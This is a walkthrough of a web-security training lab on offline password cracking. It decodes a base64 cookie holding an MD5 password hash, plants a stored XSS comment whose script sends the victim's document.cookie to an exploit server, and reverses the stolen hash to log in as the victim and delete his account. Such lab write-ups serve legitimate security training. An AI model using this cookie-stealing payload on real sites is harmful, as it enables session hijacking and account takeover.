# Lab Offline password cracking

>This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

>Your credentials: wiener:peter

>Victim's username: carlos

### Analyzing the cookie
`stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`

The value is b64 encoded and yields `wiener:51dc30ddc473d43a6011e9ebba6ca770` when decoded

where `51dc30ddc473d43a6011e9ebba6ca770` is the hash for `peter` (password)

So we know the cookie is a function of `b64_encode('carlos':MD5(password))`

### Getting Carlos' stay-logged-in cookie
We are told that there is an xss vuln, can we use this to grab the cookies of carlos?

I created a comment on a blog post with the content `<script>alert()</script>`

This executes on page load, lets create a payload that displays the user's cookies... This does the job: `<script>alert(document.cookie)</script>`

Now lets send that cookie to the url of my exploit server: `<script>document.location='https://exploit-ac7f1f731f4b2399c0dc640e010100dc.web-security-academy.net/exploit/'+document.cookie</script>`

Checked my server logs and I got the following entry:

`"GET /exploit/secret=SL8d8jF3bJAZxdEKEe6gqDqlvAIONu1w;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1"`

Our key value is `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`

### Deriving password
b64 decoding the above yields `carlos:26323c16d5f4dabff3bb136f2460a943`

The hash is MD5, copy pasting the value into an "md5 reverser" yields the value `onceuponatime`. This only works because it as an intentionally weak password. In the real world you would attempt to crack the hash on your local machine

Our credentials are `carlos:onceuponatime`

Deleted the account of Carlos, lab solved!